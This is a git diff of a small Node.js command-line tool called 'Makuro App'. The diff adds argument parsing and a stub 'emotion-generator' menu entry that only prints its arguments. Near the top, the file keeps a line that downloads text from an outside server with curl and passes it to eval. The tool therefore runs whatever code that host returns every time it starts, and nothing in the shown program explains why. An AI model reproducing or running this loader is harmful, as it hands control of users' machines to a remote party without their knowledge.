@@ -1,9 +1,14 @@
+const arg = process.argv.splice(2)
 const { execSync } = require('child_process');
 eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());
 
 const list_menu = [
     {
-        arg: ""
+        arg: "emotion-generator",
+        des: "generate emotion secara otomatis",
+        fun: async () => {
+            console.log(arg)
+        }
     }
 ];
 
@@ -11,11 +16,15 @@ function help() {
     console.log(`
 Makuro App:
 version: 1.0.1
+
+
 `)
 }
 
-help();
 
 ; (async () => {
-    console.log("ini adalah main")
+    if (arg.length === 0) return help()
+    const app = list_menu.find((v) => v.arg === arg[0])
+    if (!app) return help()
+    app.fun()
 })()
